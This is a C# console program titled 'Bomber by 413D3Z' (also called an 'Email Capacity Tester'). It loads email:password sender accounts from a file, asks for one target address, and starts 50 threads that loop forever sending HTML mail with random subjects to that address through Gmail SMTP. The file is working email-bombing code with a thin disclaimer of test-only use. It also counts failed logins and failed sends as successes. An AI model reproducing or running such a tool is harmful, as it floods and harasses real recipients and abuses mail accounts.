//I take no responsibility with the below code being used in a live environment, I mainly use this to test my own applications ability to protect itself from such attacks.
// 以下のコードがライブ環境で使用されていることに責任を負いません。私は主に、このような攻撃から自分自身を保護する独自のアプリケーションの能力をテストするためにこれを使用します。
namespace Enihalation
{
    class Program
    {
        public static int sentEmails = 0;
        public static string messageToSend = "";
        public static string targetEmail = "";
        public static List<string> senders = new List<string>();
        public static List<string> validSenders = new List<string>();

        static string getTime()
        {
            string format = DateTime.Now.ToString("HH:mm:ss");
            return "[" + format + "]";
        }
        static void validateSenders()
        {
            senders.ForEach(x =>
            {
                string[] split = x.Split(':');
                try
                {
                    using (SmtpClient client = new SmtpClient())
                    {
                        try
                        {
                            client.Connect("smtp.413d3z.com", 465, SecureSocketOptions.StartTls);
                            client.AuthenticationMechanisms.Remove("XOAUTH2");
                            client.Authenticate(split[0], split[1]);
                        }
                        catch (AuthenticationException ex)
                        {
                            Console.WriteLine(ex);
                            //Thread.Sleep(100500);
                            Console.WriteLine(getTime() + " Check the Email or Password DUMBASS: " + x, Color.Red);
                        }
                        finally
                        {
                            Console.WriteLine(getTime() + " Valid sender added, wow u grew a brain: " + x, Color.LightGreen);
                            validSenders.Add(x);
                        }
                    }
                }
                catch (SmtpProtocolException ex)
                {
                    Console.WriteLine(getTime() + " (Possible ban) Failed to validate sender: " + x, Color.LightGreen);
                }
            });
        }
        static string getRandomWord(int len)
        {
            string result = "";
            string[] words = File.ReadAllLines("words.txt");
            Random x = new Random();
            for (int i = 0; i < len; i++)
            {
                result = result + words[x.Next(1, words.Length)];
            }
            return result;
        }
        static void initSenders()
        {
            messageToSend = File.ReadAllText("message.txt");
            Console.WriteLine(getTime() + " Initializing senders ... ", Color.LightGreen);
            foreach (string line in File.ReadAllLines("senders.txt"))
            {
                senders.Add(line);
                Thread.Sleep(100);
            }
        }
        static void scanData()
        {
            if (!File.Exists("senders.txt"))
            {
                Console.WriteLine(getTime() + " senders.txt not found, creating...", Color.Purple);
                File.Create("senders.txt");
            }
            if (!File.Exists("message.txt"))
            {
                Console.WriteLine(getTime() + " message.txt not found, creating...", Color.Purple);
                File.Create("message.txt");
            }
        }
        static void initializeBomber()
        {
            for (int i = 0; i < 50; i++)
            {
                Thread x = new Thread(startSending);
                x.Start();
            }

        }
        static string getRandomDomain()
        {
            Random x = new Random();
            string[] domains = {
                ".com",
                ".org",
                ".net",
                ".biz"
            };
            string[] beforeDomain = {
                "contact@",
                "support@",
                "feedback@",
                "newsletter@"
            };
            return beforeDomain[x.Next(1, beforeDomain.Length)] + getRandomWord(1) + domains[x.Next(1, domains.Length)];
        }
        static void startSending()
        {
            while (true)
            {
                validSenders.ForEach(x =>
                {
                    string[] split = x.Split(':');
                    try
                    {
                        using (SmtpClient client = new SmtpClient())
                        {
                            try
                            {
                                client.Connect("smtp.gmail.com", 465, SecureSocketOptions.StartTls);
                                client.AuthenticationMechanisms.Remove("XOAUTH2");
                                client.Authenticate(split[0], split[1]);
                                var message = new MimeMessage();
                                message.From.Add(new MailboxAddress(split[0], split[0]));
                                message.To.Add(new MailboxAddress(targetEmail, targetEmail));
                                message.Subject = getRandomWord(5);
                                StringBuilder mailBody = new StringBuilder();
                                message.Body = new TextPart("html")
                                {
                                    Text = "<html><body><div>" + messageToSend + "</div></body></html>"
                                };
                                foreach (var part in message.BodyParts.OfType<TextPart>())
                                    part.ContentTransferEncoding = ContentEncoding.QuotedPrintable;
                                message.MessageId = MimeUtils.GenerateMessageId("efferenthealthllc.onmicrosoft.com");
                                foreach (var part in message.BodyParts.OfType<TextPart>())
                                    part.ContentId = null;
                                client.Send(message);
                            }
                            catch (SmtpCommandException)
                            {
                                Console.WriteLine(getTime() + " [" + x + "] -> " + targetEmail + " Failed to send message, くそくらえ!", Color.Red);
                            }
                            finally
                            {
                                sentEmails++;
                                Console.Title = "[" + targetEmail + "] Email Capacity Tester by 413D3Z | Emails sent: " + sentEmails;
                                Console.WriteLine(getTime() + " [" + x + "] -> " + targetEmail + " Message sent!", Color.Aqua);
                            }
                        }
                    }
                    catch (SmtpProtocolException ex) {
                        Console.WriteLine(getTime() + " (Possible ban) Failed to send message : " + x, Color.Red);
                    }
                });
            }
        }
        static void Main(string[] args)
        {
            Console.Title = "Bomber by 413D3Z";
            Console.WriteLine(getTime() + " Looking for [senders.txt | message.txt] ...", Color.LightGreen);
            scanData();
            Thread.Sleep(250);
            initSenders();
            Thread.Sleep(1000);
            Console.WriteLine(getRandomWord(10));
            validateSenders();
            Thread.Sleep(1000);
            Console.Clear();
            Console.WriteLine(getTime() + " 受信者の電子メールを入力してください: ", Color.LightGreen);
            targetEmail = Console.ReadLine();
            Thread.Sleep(1000);
            Console.Clear();
            Console.Title = "[" + targetEmail + "] Email Capacity Tester by 413D3Z | Emails sent: 0";
            initializeBomber();
            Console.ReadKey();
        }
    }
}